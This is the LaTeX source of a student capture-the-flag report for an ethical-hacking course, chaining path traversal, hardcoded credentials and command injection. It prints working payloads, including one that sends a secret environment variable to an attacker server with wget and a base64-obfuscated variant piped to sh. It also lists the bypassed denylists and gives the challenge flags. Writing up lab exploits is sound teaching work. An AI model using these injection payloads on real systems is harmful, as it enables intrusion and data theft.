@@ -1,0 +1,135 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%                                DO NOT EDIT                                    %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\documentclass[a4paper, 11pt]{article}
+\usepackage[top=2.5cm, bottom=2.5cm, left=2cm, right=2cm]{geometry} 
+\geometry{a4paper} 
+\usepackage[utf8]{inputenc}
+\usepackage{textcomp}
+\usepackage{graphicx} 
+\usepackage{amsmath,amssymb}  
+\usepackage{bm}  
+\usepackage[pdftex,bookmarks,colorlinks,breaklinks]{hyperref}  
+\usepackage{memhfixc} 
+\usepackage{pdfsync}  
+\usepackage{fancyhdr}
+\usepackage{listings}
+\usepackage{xcolor}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{codestyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+\lstset{style=codestyle}
+\pagestyle{fancy}
+\pagenumbering{gobble}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+% DO NOT EDIT the structure of the document and stick to the provided template!
+% The report must be in English and PDF format. Do not send files other than the report.
+% It must be at most 1 page long, not counting images, code and references.
+% Images and code should be included in the report only if they add useful information.
+% A person reading the report should be able to understand the vulnerability and exploit it without looking for further information.
+
+\title{First Report, Unfair NetBisca}
+\author{Filippo De Grandi}
+\date{07/03/2025}
+
+\makeatletter
+\lhead{\@author,\space\@date}
+\rhead{\@title}
+\lfoot{Ethical Hacking 2024/25}
+\rfoot{University of Trento}
+
+\begin{document}
+
+\section*{Background}
+% Briefly introduce the background on the challenge topic. Describe the class of the vulnerability that affects the target system, why it happens, and its consequences. You might also describe how the vulnerability can be prevented. In this section, you should not describe the challenge details.
+% The background section should be well referenced \cite{bibtex}.
+
+The NetBisca challenge is affected by multiple vulnerabilities. \\ 
+Firstly, the application is vulnerable to \textbf{Path Traversal} attacks \cite{path_traversal}. This vulnerability allows an attacker to get the contents of files that would instead be inaccessible and / or confidential. The attacker can exploit this vulnerability to access sensitive information, such as configuration files, passwords, and other critical system files. \\
+Secondly, the file retrieved through the Path Traversal vulnerability contains \textbf{Hardcoded Credentials} \cite{hardcoded}. This almost certainly enables malicious actors to gain access to the account for which the credentials are hardcoded, which mostly are admin ones. \\
+Thirdly, a \textbf{Command Injection} vulnerability \cite{command_injection} is present. It allows an attacker to execute arbitrary commands on the system, possibly leading to the attacker gaining full control over it, which can result in data loss, data theft, or even a complete system compromise. \\
+
+\section*{Vulnerability}
+% Briefly describe the specific instance of the vulnerability that affects the target system.
+The challenges base urls are \texttt{http://cyberchallenge.disi.unitn.it:\{50000,50005\}}, and will be referenced as \texttt{URL}.
+For both the versions, the Path Traversal vulnerability is in \\ \texttt{GET URL/image/?filename=<path>}, which would normally be used to retrieve card images.
+This enables the retrieval of the codebase contained in the \texttt{app.py} file.
+The server does perform naive sanitization by removing (non recursively) \texttt{../} patterns.\\
+Then, the Command Injection vulnerability is found at \texttt{POST URL/send-mail}, specifically in the \texttt{message} field.
+
+\section*{Solution}
+% Describe the solution of the challenge and the exploit.
+% You can include snippets of code, such as in Listing \ref{lst:example}
+% \lstinputlisting[language=python,label=lst:example,caption=Some example code]{solution.py}
+
+First, a call to \texttt{GET URL/image/?filename=....//....//app/app.py} is made to retrieve the codebase. The hardcoded credentials for the \texttt{admin} account are found inside the \texttt{app.py} file. \\
+Then, after logging in as admin, a call to \texttt{POST URL/send-mail}, either through the website or via CLI, while logged in as admin made with a malicious payload can enable the disclosure of the \texttt{FLAG} environment variable, as this command gets created line 335 (349 on version 2): \texttt{command = f'echo "\{message\}" | mail -s "\{subject\}" "\{to\}"'} and later executed via \\
+\texttt{subprocess.run(command, shell=True, check=True, capture\_output=True, text=True, timeout=5)}. \\ 
+The code performs sanitization on the variables by removing some illegal patterns, but they can be bypassed.
+Here are the solutions for the two versions:
+\begin{itemize}
+  \item{port 50000}: The server performs sanitization by utilizing the denylists in Listing \ref{lst:denylist}. The payload can be created without \texttt{curl} and still be able to make outbound HTTP requests like this: \\ 
+    \texttt{"; wget "http://<attacker-server-url>?flag=\$FLAG} \\ 
+    In this way, the flag is sent to the attacker's server, and the challenge is solved: \\ 
+    \texttt{UniTN\{pl4Y\_7h3\_b1sc4\_Wi7h0ut\_t7e\_n33d\_of\_shUfF1ing!\}}
+  \item{port 50005}: In this version, the denylist is more strict \ref{lst:denylist2}, but it can be tricked by encoding the command in Base64: \\ 
+    \texttt{"; echo eW91IGFjdHVhbGx5IGRpZCBkZWNvZGUgdGhpcyBzdHJpbmcuIEt1ZG9zIHRv \\ IHlvdQ== | base64 -d | sh; echo "},
+    where the Base64 encoded string translates to \\
+    \texttt{wget -qO- "<attacker-server-url>?flag=\$FLAG"}.
+    Just like before, this ends the challenge: \\
+    \texttt{UniTN\{4rE\_y0u\_s7iLl\_pl4YinG\_7h3\_b1sc4\_??!?\}}
+\end{itemize}
+
+\newpage
+
+The code for the solution can be found in Listing \ref{lst:solution}.
+
+A mitigation to the problems of this website would be to not play the game at all. It is, in fact, unfair by design.
+
+\begin{lstlisting}[language=python, caption=Denylist for port 50000, label=lst:denylist]
+DENYLISTED_KEYWORDS = [
+    'curl', # Prevent outbound HTTP requests
+]
+
+FORBIDDEN_CHARACTERS = [
+    '`', '$('
+]
+\end{lstlisting}
+
+\begin{lstlisting}[language=python, caption=Denylist for port 50005, label=lst:denylist2]
+DENYLISTED_KEYWORDS = [
+    'wget', 'curl', 'dig', 'bash', 'python', 'ping', 'nc', 'netcat', 'ssh', 'scp', 'sftp', 'ftp', 'telnet', 'rm', 'mv'
+]
+
+FORBIDDEN_CHARACTERS = [
+    '`', '$(',
+]
+\end{lstlisting}
+
+\lstinputlisting[language=python,label=lst:solution,caption=Solution code, label=lst:solution]{solution.py}
+
+\bibliographystyle{abbrv}
+\bibliography{references}
+\end{document}
